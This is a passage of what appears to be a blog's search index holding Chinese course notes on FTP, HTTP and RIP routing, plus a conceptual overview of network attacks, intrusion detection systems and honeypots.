ASCII字符，而接收端从NVT ASCII字符转换成它自己的字符</li><li>EBCDIC文件:若连接的一端或两端使用EBCDIC编码，则可使用EBCDIC编码传送文件</li><li>图像文件:传送二进制文件的默认格式。这种文件是作为连续的比特流传送而没有任何解释或编码。在大多数情况下它用来传送二进制文件，如已编译的程序。</li></ol><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><ul><li>文件结构（默认)︰这种文件没有结构，它是连续的字节流</li><li>记录结构:这种文件划分为一些记录，这只能用于文本文件</li><li>页面结构:这种文件划分为一些页面，每一个页面有页面号和页面首部。页面可以随机地或顺序地进行存取</li></ul><h4 id="传输方式"><a href="#传输方式" class="headerlink" title="传输方式"></a>传输方式</h4><blockquote><p>流方式:这是默认方式。数据作为连续的字节流从FTP交付给TCP。TCP负责把数据划分为适当大小的报文。若数据是简单的字节流（文件结构），就不需要文件结束符。若数据划分为记录（记录结构)，则每一个记录有1字节的记录结束（EOR）字符，而在文件的结束处有文件结束（EOF）字符。</p></blockquote><blockquote><p>块方式:数据可以按块从FTP交付给TCP。每一个块的前面有3字节首部。第一个字节叫做块描述符，后两个字节定义块的大小，以字节为单位。</p></blockquote><blockquote><p>压缩方式:若文件很大，数据可进行压缩。通常使用的压缩方法是游程长度编码。数据单元的连续出现数可以用一个“出现”和“重复数”来替换。在文本文件中，这通常是空格。在二进制文件中，空字符常常被压缩。</p></blockquote><h4 id="文件传送"><a href="#文件传送" class="headerlink" title="文件传送"></a>文件传送</h4><blockquote><p>从服务器把文件复制到客户端叫做<strong>读取</strong>文件，使用RETR命令完成</p></blockquote><blockquote><p>从客户端把文件复制到服务器叫做<strong>存储</strong>文件，使用STOR命令完成。</p></blockquote><p>从服务器向客户端发送目录列表或文件名，使用LIST命令完成。FTP把目录或文件名列表当作文件，在数据连接上发送。</p><img src="./网际协议IP/FTP文件传送.png" style="zoom:67%;" /><h3 id="FTP响应与命令："><a href="#FTP响应与命令：" class="headerlink" title="FTP响应与命令："></a>FTP响应与命令：</h3><blockquote><p style="color:blue;">FTP使用控制连接在客户进程和服务器进程之间完成交互操作，客户端向服务器发送命令，服务器给客户返回响应</p></blockquote><h5 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h5><ul><li>命令形式是ASCII大写字符，后面的变量可以有，也可以没有。</li><li>命令可以粗略地划分为6组:接口命令、文件管理命令、数据格式化命端口定义命令、文件传送命令以及杂项命令。</li></ul><img src="./网际协议IP/FTP命令.png" style="zoom: 50%;" /><h5 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h5><blockquote><p style="color:blue;">每一个FTP命令都应该有响应。响应由两个部分组成:3个数字以及跟随在后面的文本。数字部分定义代码，文本部分定义所需的参数或额外的解释</p></blockquote><img src="./网际协议IP/FTP相应.png" style="zoom:67%;" /><h2 id="超文本传输协议HTTP"><a href="#超文本传输协议HTTP" class="headerlink" title="超文本传输协议HTTP"></a>超文本传输协议HTTP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#掌握HTTP的报文格式</span><span class="token comment">#掌握HTTP的工作原理</span><span class="token comment">#掌握HTTP常用方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="万维网体系结构"><a href="#万维网体系结构" class="headerlink" title="万维网体系结构"></a>万维网体系结构</h3><p>万维网，全称为World Wide Web，是一个由许多互相链接的超文本组成的系统，通过互联网访问。</p><ul><li>在这个系统中，每个有用的事物，称为“资源”，由全局“统一资源标识符(URL)”标识;这些资源通过超文本传输协议传送给用户，用户通过点击超链接来获得资源</li><li>每一个网站保存有一个或多个文档，叫做万维网页面。浏览器用来读取万维网上的文档<ul><li>客户需要查看网站A的某些信息，它向网站A发送一个请求，请求包含了网站A和其中万维网页面的地址，称为统一资源定位符(URL)</li><li>网站A收到请求后，将指定的文档发送给这个客户。</li></ul></li></ul><img src="./网际协议IP/用户访问万维网示意图.png" style="zoom:67%;" /><center>用户访问万维网的示意图</center>> <p style="color:orange;">WWW服务是分布式的客户/服务器模式</p><p><strong>浏览器：</strong>客户端程序，可以解释和显示万维网页面。</p><p><strong>服务器：</strong></p><blockquote><ul><li>万维网页面存储在服务器上，当客户请求到达时，对应的页面就发送给客户</li><li>为了提高效率，服务器通常在其高速缓存中存放被请求过的页面</li><li>通过多线程或多进程可使服务器的效率更加提高，服务器在同一时间可回答多个请求</li></ul></blockquote><h4 id="统一资源定位符（URL"><a href="#统一资源定位符（URL" class="headerlink" title="统一资源定位符（URL)"></a>统一资源定位符（URL)</h4><blockquote><p style="color:orange;">Uniform Resource Locator，用于表示Internet上资源的位置和访问方法</p></blockquote><ul><li><p>URL由4部分组成:</p><ol><li><p><strong>协议</strong>:指定了用这个URL的客户/服务器程序。如，HTTP、FTP和TELNET等</p></li><li><p>主机:指明了信息所存放的地址，可以是逻辑地址也可以是相应的域名</p></li><li><p>端口:指定了使用主机的某个端口，端口是可选的。</p><blockquote><p style="color:blue;">如果包含了端口，那么端口就插入在主机和路径之间，和主机用冒号分隔开</p></blockquote></li><li><p>路径:指定了文件存放的位置。路径本身可以包含斜线，用于将目录与子目录和文件分隔开。</p></li></ol></li></ul><img src="./网际协议IP/统一资源定位符.png" style="zoom:50%;" /><center>统一资源定位符格式:</center>##### 静态文档<p>内容固定的文档，由服务器创建。文档的内容是在创建文档时就确定的，而不是在使用它时。</p><h5 id="动态文档"><a href="#动态文档" class="headerlink" title="动态文档"></a>动态文档</h5><p>在浏览器请求该文档时才由万维网服务器创建出来。当请水到丛的，力维网服务器就运行创建动态文档的应用程序。服务器返回这个程序或脚本的输出，把它作为对请求该文档的浏览器的响应。<br>对每个请求都创建出新的文档，所以每个请求得到的动态文档内容可能不同。</p><h5 id="活动文档"><a href="#活动文档" class="headerlink" title="活动文档"></a>活动文档</h5><p>有些文档需要程序在客户端运行，称为活动文档。当浏览器请求活动文档时，服务器就发送这个文档的一个副本或脚本，然后这个文档就在客户（浏览器)端运行。</p><h3 id="HTTP报文格式："><a href="#HTTP报文格式：" class="headerlink" title="HTTP报文格式："></a>HTTP报文格式：</h3><p>超文本传输协议，Hyperlext Transfer Protocol，用于访问万维网上的数据</p><p>它是一种详细规定了浏览器和万维网服务器之间互相通信的规则，通过因特网传送万维网文档的数据传送协议。<br>协议以普通文本、超文本、音频、视频等格式传输数据，它可以快速的在文档之间跳转</p><ul><li><blockquote><p style="color:orange;">HTTP是一个应用层协议，它使用TCP连接进行可靠的传送，在熟知端口80上提供服务。</p></blockquote></li></ul><blockquote><p style="color:black;">HTTP报文有两种类型:请求报文和响应报文</p>- 两种报文格式只有开始行不同。</blockquote><ul><li><p>首部行</p><ul><li>用来说明浏览器、服务器或报文主体的一些信息。</li><li>由关键字/值对组成，每行一对，关键字和值用英文冒号“:”分隔，结束的地方都要有回车换行</li><li>首部可以有好几行，但也可以不使用。</li><li>整个首部行结束时，还要有一个空行将首部行和后面的实体主体分</li></ul></li><li><p>实体主体</p><ul><li>在请求报文中一般不用，而在响应报文中也可能没有这个字段</li></ul></li></ul><h4 id="HTTP请求报文："><a href="#HTTP请求报文：" class="headerlink" title="HTTP请求报文："></a>HTTP请求报文：</h4><img src="./网际协议IP/HTTP请求报文.png" style="zoom:67%;" /><ul><li><p>方法:</p><ul><li><p>常见的有GET和POST方法，在地址栏中输入网址访问网页时，浏览器采用GET方法向服务器获取资源，POST方法要求服务器接受附在请求后面的数据，常用于提交表单。</p><img src="./网际协议IP/HTTP方法.png" style="zoom:67%;" /></li></ul></li><li><p>URL:向服务器请求的资源</p></li><li><p>HTTP版本:目前是http/1.1。</p></li><li><p>首部字段：</p><ul><li>Accept:指定客户端接受哪些类型的信息，如text/html,image/gif等</li><li>Accept-Language:指定一种自然语言。</li><li>Accept-Encoding:指定可接受的内容编码，如gzip, deflate。</li><li>User-Agent: 允许客户端将它的操作系统、浏览器和其它属性告诉服务器</li><li>Host:目标服务器</li><li>Connection:连接状态，如Keep-Alive，Close。</li></ul></li></ul><h4 id="HTTP回应报文"><a href="#HTTP回应报文" class="headerlink" title="HTTP回应报文"></a>HTTP回应报文</h4><img src="./网际协议IP/HTTP回应报文.png" style="zoom:67%;" /><ul><li><p>版本:与请求报文相同</p></li><li><p>状态码:表示服务器的响应类型，有三位数字组成，其中第一个数字定义了响应的类别，有五种可能取值:</p><blockquote><ul><li>1xx:通知信息—表示请求已接收，继续处理</li><li>2xx:成功—表示请求已被成功接收、理解、接受</li><li>3xx:重定向一用于已经移动的文件</li><li>4xx:客户端错误—请求有语法错误或请求无法实现</li><li>5xx:服务器端错误—服务器失效无法完成请求</li></ul></blockquote></li></ul><img src="./网际协议IP/HTTP协议状态码.png" style="zoom: 50%;" /><center>HTTP协议状态码：</center>- 短语:解释状态码的简单短语- 首部字段  - Date:消息产生时间  - Server:服务器用来处理请求的软件  - Set- cookie:设置Cookie及其路径  - Content-Length:实体正文的长度，十进制  - Connection:连接状态。  - Content-Type:发送给接收者的实体正文的媒体类型，如Content-Type:text/html;charset=GB2312。<h3 id="持久与非持久链接"><a href="#持久与非持久链接" class="headerlink" title="持久与非持久链接"></a>持久与非持久链接</h3><h4 id="非持久连接"><a href="#非持久连接" class="headerlink" title="非持久连接"></a>非持久连接</h4><ul><li>对每一个请求/响应都要建立一次TCP连接</li><li>非持久连接策略给服务器造成了很大的开销，因为服务器需要N个不同的缓存，而每次打开连接时都要使用慢开始过程</li><li>版本1.1以前的HTTP协议默认是非持久连接</li></ul><h4 id="持久连接"><a href="#持久连接" class="headerlink" title="持久连接"></a>持久连接</h4><ul><li><p>在使用持久连接时，服务器在发送响应后，让连接继续为一些请求打开</p></li><li><p>服务器可以在客户发送关闭请求时等待或关闭这个连接。</p></li><li><p>服务器可在相同的TCP连接上向客户发送多个对象</p><blockquote><p>HTTP版本1.1默认使用持久连接策略。</p></blockquote></li></ul><h3 id="万维网的工作过程："><a href="#万维网的工作过程：" class="headerlink" title="万维网的工作过程："></a>万维网的工作过程：</h3><p>每个万维网网点都有一个服务器,它不断地监听TCP的端口80，以便发现是否有浏览器（即万维网客户)向它发出连接建立请求。一旦监听到连接请求并建立了TCP连接之后，浏览器就向万维网服务器发出浏览某个页面的请求，服务器接着就返回所请求的页面作为响应。最后释放TCP连接。</p><img src="./网际协议IP/万维网工作过程.png" style="zoom:67%;" /><h2 id="路由信息协议RIP"><a href="#路由信息协议RIP" class="headerlink" title="路由信息协议RIP"></a>路由信息协议RIP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#掌握路由协议的分类，理解静态路由和动态路由</span><span class="token comment">#掌握动态路由协议RIP的报文格式、工作原理及工作过程</span><span class="token comment">#掌握RIP计时器的作用</span><span class="token comment">#理解RIP的稳定性</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="一、路由分类："><a href="#一、路由分类：" class="headerlink" title="一、路由分类："></a>一、路由分类：</h3><h4 id="静态路由与动态路由："><a href="#静态路由与动态路由：" class="headerlink" title="静态路由与动态路由："></a>静态路由与动态路由：</h4><h5 id="路由选择"><a href="#路由选择" class="headerlink" title="路由选择:"></a>路由选择:</h5><blockquote><p>在从源点到终点的通信过程中，数据包可能经过多个路由器，直到到达连接，目的网络路由器为止。<br>当路由器收到数据包时，它应当将数据包转发到哪一个网络，取决于路由表的信息。</p></blockquote><h5 id="路由表"><a href="#路由表" class="headerlink" title="路由表:"></a>路由表:</h5><blockquote><p>静态路由表:路由信息是管理员设置的，并由管理员手动进行更新。</p></blockquote><blockquote><p>动态路由表:路由信息是随着互联网的变化而自动更新的。</p></blockquote><p>**路由选择协议:**路由选择协议是一些规则和过程的组合。规则使得路由器之间能够共享他们所知道的互联网情况和邻站信息，而过程用来合并从其它路由器收到的信息。</p><h4 id="外部和内部路由选择："><a href="#外部和内部路由选择：" class="headerlink" title="外部和内部路由选择："></a>外部和内部路由选择：</h4><p><strong>自治系统（AS,Autonomous System)</strong><br>由同一个管理机构管理、使用统一路由策略的路由器的集合。<br>最初，自治系统内部只考虑运行单个路由协议;然而，随着网络的发展，一个自治系统内现在也可以支持同时运行多种路由协议</p><img src="./网际协议IP/自治系统.png" style="zoom:67%;" /><h5 id="两大类路由选择协议"><a href="#两大类路由选择协议" class="headerlink" title="两大类路由选择协议"></a>两大类路由选择协议</h5><p><strong>内部网关协议IGP(Interior Gateway Protocol)：</strong></p><blockquote><p style="color:blue;">内部网关协议IGP(Interior Gateway Protocol):在一个自治系统内部使用的路由选择协议</p>- 目前这类路由选择(域内路由选择)协议使用得最多，如**RIP**和**OSPF协议**。</blockquote><p><strong>外部网关协议EGP(External Gateway Protocol):</strong></p><blockquote><p style="color:blue;">外部网关协议EGP(External Gateway Protocol):在自治系统之间使用的路由选择协议</p>- 在外部网关协议中目前使用最多的是**BGP-4**协议</blockquote><h5 id="距离向量路由选择协议"><a href="#距离向量路由选择协议" class="headerlink" title="距离向量路由选择协议:"></a>距离向量路由选择协议:</h5><ol><li>从路由器到直接连接的网络的距离定义为1</li><li>从路由器到非直接连接的网络的距离定义为所经过的路由器数加1，因此也称为“跳数”</li><li>每个节点维护一个到其它节点的最小距离向量表</li><li>初始状态下，每个节点只知道到与它直接相连的节点的代价</li><li>节点周期性地向其所有相邻节点发送它的路由表信息</li><li>当一个节点从邻站收到路由表信息时，使用<strong>Bellman-Ford算法</strong>更新其路由表</li></ol><h3 id="二、RIP协议："><a href="#二、RIP协议：" class="headerlink" title="二、RIP协议："></a>二、RIP协议：</h3><h4 id="2-1：路由信息协议-Routing-Information-Protocol"><a href="#2-1：路由信息协议-Routing-Information-Protocol" class="headerlink" title="2.1：路由信息协议(Routing Information Protocol)"></a>2.1：路由信息协议(Routing Information Protocol)</h4><p>应用较早、使用较普遍的<strong>内部网关协议</strong>，适用于小型同类网络，是典型的<strong>距离向量路由协议</strong>。</p><blockquote><ul><li><p style="color:orange;">通过广播UDP协议520端口封装成的报文来交换路由信息，默认每30秒发送一次路由信息更新报文</p></li><li><p style="color:orange;">RIP使用跳数作为路由距离度量，即数据报到达目标设备所必须经过的路由器数目</p></li><li><p style="color:orange;">RIP最多支持的跳数为15，跳数16表示不可达</p></li></ul></blockquote><h5 id="RIP的工作原理"><a href="#RIP的工作原理" class="headerlink" title="RIP的工作原理"></a>RIP的工作原理</h5><ol><li>路由器启动时，路由表中只包含直通路由。运行RIP后，路由器会发送Request报文，用来请求邻居路由器的RIP路由</li><li>运行RIP的邻居路由器收到该Request报文后，会根据自己的路由表，生成Response报文进行回复</li><li>路由器在收到Response报文后，会将相应的路由添加到自己的路由表中</li><li>RIP网络稳定以后，每个路由器会<strong>周期性</strong>的向<strong>邻居路由器</strong>通稿自己的<strong>整张路由表</strong>中的路由信息，默认周期为30秒。邻居路由器根据收到的路由信息刷新自己的路由表</li><li>路由表中的每一路由项都对应了一个老化定时器，当路由项在180秒内没有任何更新时，定时器超时，该路由项的度量值变为不可达</li><li>某路由项的度量值变为不可达后，该路由会在Response报文中发布四次(120秒)，然后从路由表中清除。</li></ol><h5 id="RIP协议的特点"><a href="#RIP协议的特点" class="headerlink" title="RIP协议的特点"></a>RIP协议的特点</h5><p>仅和相邻路由器交换信息。</p><pre class="line-numbers language-none"><code class="language-none">交换的信息是当前本路由器所知道的全部信息，即自己的路由表按固定的时间间隔交换路由信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="RIPv1-vs-RIPv2"><a href="#RIPv1-vs-RIPv2" class="headerlink" title="RIPv1 vs RIPv2"></a>RIPv1 vs RIPv2</h5><p><strong>RIPv1</strong></p><blockquote><p style="color:orange;">有类别路由协议，不支持VLSM和CIDR且不支持认证。以广播的形式发送报文，目的IP地址为广播地址255.255.255.255</p></blockquote><p><strong>RIPv2</strong></p><blockquote><p style="color:orange;">无类别路由协议，支持VLSM、路由聚合与CIDR，支持明文认证和MD5密文认证，以广播或者组播(224.0.0.9)方式发送报文</p></blockquote><h4 id="2-2：RIP协议报文格式："><a href="#2-2：RIP协议报文格式：" class="headerlink" title="2.2：RIP协议报文格式："></a>2.2：RIP协议报文格式：</h4><h5 id="RIPv1的报文格式："><a href="#RIPv1的报文格式：" class="headerlink" title="RIPv1的报文格式："></a>RIPv1的报文格式：</h5><img src="./网际协议IP/RIPv1的报文格式.png" style="zoom:67%;" /><p> 每个字段的值和作用</p><blockquote><p>Command:表示该报文是一个请求报文还是响应报文，1表示该报文是请求报文，2表示该报文是响应报文</p><p>Version:表示RIP的版本信息。对于RIPv1，该字段的值为1</p><p>Address Family ldentifier (AFI):表示地址标识信息，对于IP协议，其值为2</p><p>lP address:表示该路由条目的目的IP地址。这一项可以是网络地址、主机地址</p><p>Metric:路由条目的度量值，取值范围1-16。</p></blockquote><blockquote><p style="color:blue;">一个RIP路由更新消息中最多可包含25条路由表项，每个路由表项都携带了目的网络的地址和度量值。整个RIP报文大小限制为不超过504字节，如果整个路由表的更新消息超过该大小，需要发送多个RIPv1报文</p></blockquote><h5 id="RIPv2的报文格式："><a href="#RIPv2的报文格式：" class="headerlink" title="RIPv2的报文格式："></a>RIPv2的报文格式：</h5><img src="./网际协议IP/RIPv2的报文格式.png" style="zoom: 50%;" /><p><strong>RIPv1与RIPv2的不同的字段</strong></p><blockquote><p>AFI:地址族标识除了表示支持的协议类型外，还可以用来描述认证信息<br>Route tag:用于标记外部路由。<br>Subnet Mask:指定IP地址的子网掩码，定义IP地址的网络或子网部分<br>Next Hop:指定通往目的地址的下—跳IP地址。</p></blockquote><h3 id="三、RIP环路："><a href="#三、RIP环路：" class="headerlink" title="三、RIP环路："></a>三、RIP环路：</h3><p>RIP网络正常运行时，RTA会通过RTB学习到10.0.0.0/8网络的路由，度量值为1。一旦路由器RTB的直连网络10.0.0.0/8产生故障，RTB会立即检测到该故障，并认为该路由不可达。此时，RTA还没有收到该路由不可达的信息，于是会继续向RTB发送通往10.0.0.0/8的路由信息。RTB会学习此路由信息，认为可以通过RTA到达10.0.0.0/8网络，度量值为2。<br>此后，RTB发送的更新路由表，又会导致RTA路由表的更新，RTA会新增一条度量值为3的10.0.0.0/8网络路由表项，从而形成路由环路。这个过程会持续下去，直到度量值为16。</p><h4 id="环路避免-水平分割"><a href="#环路避免-水平分割" class="headerlink" title="环路避免-水平分割"></a>环路避免-水平分割</h4><p>路由器从某个接口学到的路由，不会从该接口再发回给邻居路由器。</p><blockquote><p>RTA从RTB学习到的10.0.0.0/8网络的路由不会再从RTA的接收接口重新通告给RTB，由此避免了路由环路的产生。</p></blockquote><img src="./网际协议IP/水平分割.png" style="zoom:67%;" /><h4 id="环路避免-毒性反转"><a href="#环路避免-毒性反转" class="headerlink" title="环路避免-毒性反转"></a>环路避免-毒性反转</h4><p>毒性反转机制的实现可以使错误路由立即超时。<br>毒性反转是指路由器从某个接口学到路由后，将该路由的跳数设置为16，并从原接收接口发回给邻居路由器</p><img src="./网际协议IP/毒性反转.png" style="zoom:67%;" /><h4 id="环路避免-触发更新"><a href="#环路避免-触发更新" class="headerlink" title="环路避免-触发更新"></a>环路避免-触发更新</h4><p style="color:skyblue;">触发更新是指当路由信息发生变化时，立即向邻居设备发送触发更新报文，而不需要等待更新定时器超时，从而加速了网络收敛</p><img src="./网际协议IP/触发更新.png" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络攻击与防范</title>
      <link href="/2022/11/24/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E8%8C%83/"/>
      <url>/2022/11/24/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E8%8C%83/</url>
      
        <content type="html"><![CDATA[<h2 id="网络攻击与防范">网络攻击与防范</h2><p>[TOC]</p><h3 id="网络攻击概述">网络攻击概述</h3><blockquote><p style="color:blue;">任何在非授权的情况下，试图存取信息、处理信息或破坏网络系统以使系统不可靠、不可用的故意行为都被称为网络攻击</p></blockquote><h3 id="常见网络攻击">常见网络攻击</h3><p>常见的网络攻击类型有：拒绝服务攻击，利用型攻击，信息收集型攻击，虚假信息型攻击</p><h4 id="拒绝服务型攻击">拒绝服务型攻击</h4><blockquote><p style="color:orange;">拒绝服务攻击（Denial of Service, DoS）利用TCP/IP协议本身的漏洞或网络中操作系统漏洞，让被攻击主机无法响应正常的用户请求而实现的</p></blockquote><ul><li>在DoS攻击中，攻击者加载过多的服务将系统，使得没有多余资源供其他用户使用。</li></ul><h5 id="分布式拒绝服务攻击">分布式拒绝服务攻击:</h5><blockquote><p style="color:orange;">分布式拒绝服务攻击（Distributed Denial of Service, DDoS）是一种基于DoS攻击、但形式特殊的拒绝服务攻击，采用一种分布、协作的大规模攻击方式</p></blockquote><ul><li>DDoS攻击是利用一批受控制的主机向一台主机发起攻击，其攻击的强度和造成的威胁要比DoS攻击严重得多</li></ul><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/分布式拒绝服务攻击.png" style="zoom: 50%;" /><h4 id="缓冲区溢出攻击">缓冲区溢出攻击</h4><p>缓冲区溢出攻击是一种常见且危害很大的系统攻击手段，攻击者向一个有限空间的缓冲区中复制过长的字符串，可能产生两种结果：</p><ol><li>过长的字符串覆盖了相邻的存储单元而造成程序瘫痪，甚至造成系统崩溃</li><li>攻击者运行恶意代码，执行任意指令，甚至获得管理员用户的权限等</li></ol><h5 id="缓冲区溢出攻击的防范">缓冲区溢出攻击的防范</h5><ul><li>编写正确的代码</li><li>非执行缓冲区保护</li><li>数组边界检查</li><li>程序指针完整性检查</li></ul><h3 id="入侵检测概述">入侵检测概述</h3><h4 id="传统安全技术的局限性">传统安全技术的局限性</h4><ol><li><strong>传统的安全技术</strong>采用严格的访问控制和数据加密策略来防护</li><li>大部分损失是由内部引起的，而传统安全技术难于防内</li><li>传统的安全技术基本上是一种<strong>被动的防护</strong>，而如今的攻击和入侵要求我们主动地去检测、发现和排除安全隐患</li></ol><h4 id="入侵检测系统概述">入侵检测系统概述</h4><p><strong>入侵（Intrusion）</strong></p><p>企图进入或滥用计算机或网络系统的行为，可能来自于网络内部的合法用户，或网络外部的非法用户</p><p><strong>入侵检测（Intrusion Detection）</strong></p><blockquote><p style="color:blue;">入侵检测系统的定义:对系统的运行状态进行监视，发现各种攻击企图、攻击行为或者攻击结果，以保证系统资源的机密性、完整性和可用性</p></blockquote><p><strong>入侵检测系统（Intrusion Detection System， IDS）</strong></p><blockquote><ul><li><p style="color:blue;">定义：进行入侵检测的软件与硬件的组合便是入侵检测系统</p></li></ul></blockquote><blockquote><ul><li><p style="color:blue;">功能：监控计算机系统或网络系统中发生的事件，根据规则进行安全审计</p></li><li><p style="color:orange;">通过从计算机网络或计算机系统的关键点收集信息并进行分析，从中发现网络或系统中是否有违反安全策略的行为和被攻击的迹象</p></li></ul></blockquote><h5 id="入侵检测相关术语">入侵检测相关术语:</h5><p>Promiscuous 混杂模式，即IDS网络接口可以看到网段中所有的网络通信量，不管其来源或目的地<br>Signatures 特征，即攻击的特征，Alerts 警告，Anomaly 异常，Console 控制台，Sensor 传感器，即检测引擎</p><h3 id="入侵检测系统">入侵检测系统</h3><p>按系统各模块的运行方式</p><ol><li>集中式：系统的各个模块包括数据的收集分析集中在一台主机上运行</li><li>分布式：系统的各个模块分布在不同的计算机和设备上</li></ol><p>根据时效性</p><ol><li>脱机分析：行为发生后，对产生的数据进行分析</li><li>联机分析：在数据产生的同时或者发生改变时进行分析</li></ol><h5 id="基于主机的入侵检测系统">基于主机的入侵检测系统</h5><p>基于主机的入侵检测系统: Host-Based IDS(HIDS)<br>系统安装在主机上面，对本主机进行安全检测</p><ul><li><p>优点</p><ul><li>审计内容全面，保护更加周密；视野集中；适用于加密及交换环境；易于用户自定义；对网络流量不敏感</li></ul></li><li><p>缺点</p><ul><li>额外产生的安全问题；HIDS依赖性强；如果主机数目多，代价过大；不能监控网络上的情况</li></ul></li></ul><h5 id="基于网络的入侵检测系统">基于网络的入侵检测系统</h5><p>基于网络的入侵检测系统：Network-Based IDS(NIDS)</p><blockquote><p style="color:blue;">系统安装在比较重要的网段内，在共享网段上对通信数据进行侦听采集数据</p></blockquote><p>优点：检测范围广，提供对网络通用的保护；无需改变主机配置和性能，安装方便；独立性，操作系统无关性；侦测速度快； 隐蔽性好 ；较少的监测器，占资源少</p><p>缺点：不能检测不同网段的网络包；很难检测复杂的需要大量计算的攻击；协同工作能力弱；难以处理加密的会话</p><blockquote><p>入侵检测系统包括三个功能部件：<strong>信息收集</strong>，<strong>信息分析</strong>，<strong>结果处理</strong></p></blockquote><h4 id="信息收集">信息收集</h4><blockquote><p style="color:blue;">入侵检测的第一步是信息收集，收集内容包括系统、网络、数据及用户活动的状态和行为</p></blockquote><ol><li>尽可能扩大检测范围：需要在计算机网络系统中的若干不同关键点（不同网段和不同主机）收集信息</li><li>要保证用来检测网络系统的软件的完整性：特别是入侵检测系统软件本身应具有相当强的坚固性，防止被篡改而收集到错误的信息</li><li>信息收集的来源：系统或网络的日志文件，网络流量，系统目录和文件的异常变化，程序执行中的异常行为</li></ol><h4 id="信息分析">信息分析</h4><p>分析得到的数据，并产生分析结果</p><ul><li><strong>模式匹配</strong>：将收集到的信息与已知的网络入侵和系统误用模式数据库进行比较，从而发现违背安全策略的行为</li><li><strong>统计分析</strong>：首先给系统对象创建一个统计描述，统计正常使用时的一些测量属性（如访问次数、操作失败次数和延时等）。测量属性的平均值和偏差将被用来与网络、系统的行为进行比较，任何观察值在正常值范围之外时，就认为有入侵发生</li><li><strong>完整性分析</strong>：事后分析，主要关注某个文件或对象是否被更改</li></ul><p>入侵检测的分析方式：异常检测（Anomaly Detection），误用检测（Misuse Detection），完整性分析</p><h5 id="异常检测：">异常检测：</h5><p>建立正常行为的特征轮廓，检查系统的运行情况</p><ul><li><p>优点</p><blockquote><p>可以检测到未知的入侵,可以检测冒用他人帐号的行为,具有自适应，自学习功能，不需要系统先验知识</p></blockquote></li><li><p>缺点</p><blockquote><p>漏报、误报率高，入侵者可以逐渐改变自己的行为模式来逃避检测，合法用户正常行为的突然改变也会造成误警，统计算法的计算量庞大，效率很低，统计点的选取和参考库的建立比较困难</p></blockquote></li></ul><h5 id="误用检测">误用检测</h5><p>提前建立已出现的入侵行为特征，检测当前用户行为特征，模式匹配</p><ul><li>优点<ul><li>算法简单，系统开销小，准确率高，效率高</li></ul></li><li>缺点<ul><li>被动，只能检测出已知攻击，新类型的攻击会对系统造成很大的威胁，模式库的建立和维护难，模式库要不断更新，知识依赖于硬件平台、操作系统和系统中运行的应用程序</li></ul></li></ul><h5 id="完整性分析">完整性分析</h5><p>通过检查系统的当前系统配置，诸如系统文件的内容或者系统表，来检查系统是否已经或者可能会遭到破坏</p><ul><li>优点 ：不管模式匹配方法和统计分析方法能否发现入侵，只要是成功的攻击导致了文件或其它对象的任何改变，它都能够发现</li><li>缺点：一般以批处理方式实现，不用于实时响应</li></ul><h4 id="结果处理">结果处理</h4><p>结果处理，即对分析结果作出反应。</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/入侵检测系统组成.png" style="zoom:67%;" /><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/入侵检测引擎工作流程.png" style="zoom: 50%;" /><center>入侵检测引擎工作流程</center>#### IDS标准化要求<p>目前网络的安全也要求IDS能够与访问控制、应急、入侵追踪等系统交换信息，相互协作，形成一个整体有效的安全保障系统</p><h5 id="cidf">CIDF</h5><p>The Common Intrusion Detection Framework, CIDF<br>CIDF是一套规范，它定义了IDS表达检测信息的标准语言以及IDS组件之间的通信协议<br>符合CIDF规范的IDS可以共享检测信息，相互通信，协同工作，还可以与其它系统配合实施统一的配置响应和恢复策略<br>CIDF的主要作用在于集成各种IDS使之协同工作，实现各IDS之间的组件重用，所以CIDF也是构建分布式IDS的基础</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/CIDF的体系结构示意图.png" style="zoom: 50%;" /><center>CIDF的体系结构示意图</center>### 计算机紧急响应 <blockquote><p>紧急响应服务能够在安全事件发生时进行紧急援助，避免造成更大的损失</p></blockquote><ul><li>应急响应的工作过程：准备，事件检测，抑制，根除，恢复，报告</li></ul><h4 id="蜜罐技术">蜜罐技术</h4><blockquote><p>蜜罐（HoneyPot）系统是试图将攻击从关键系统引诱开并能记录其一举一动的诱骗系统</p><ul><li>当检测到对蜜罐系统的访问时，很可能就有攻击者闯入</li><li>蜜罐系统的另一个目的是诱惑攻击者在该系统上浪费时间，以延缓对真正目标的攻击</li></ul></blockquote><h4 id="蜜罐的功能">蜜罐的功能</h4><ol><li>转移攻击重要系统的攻击者</li><li>收集攻击者活动的信息</li><li>希望攻击者在系统中逗留足够的时间，使管理员能对此攻击做出响应。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>超文本传输协议HTTP</title>
      <link href="/2022/11/18/HTTP%E5%8D%8F%E8%AE%AE/"/>
      <url>/2022/11/18/HTTP%E5%8D%8F%E8%AE%AE/</url>
      
